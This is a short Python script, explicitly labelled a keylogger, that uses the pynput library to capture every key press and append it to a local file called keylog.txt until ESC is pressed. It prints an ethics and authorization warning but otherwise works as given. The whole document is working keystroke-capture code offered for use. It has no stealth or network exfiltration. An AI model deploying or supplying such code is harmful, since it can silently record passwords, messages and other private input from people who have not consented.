import time
from pynput.keyboard import Key, Listener

# Configuration
LOG_FILE = "keylog.txt"

def on_press(key):
    """Callback function to handle key presses"""
    try:
        # Handle regular characters
        char = key.char
    except AttributeError:
        # Handle special keys
        char = f"[{str(key).replace('Key.', '')}]"

    # Write to log file
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(char)

    # Stop listener when escape key is pressed
    if key == Key.esc:
        return False

def main():
    """Main function to start the keylogger"""
    print("Keylogger started (press ESC to stop)...")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Legal disclaimer
    print("WARNING: Keyloggers should only be used for ethical purposes.")
    print("Ensure you have proper authorization before using this tool.")
    time.sleep(2)  # Give user time to read warning
    main()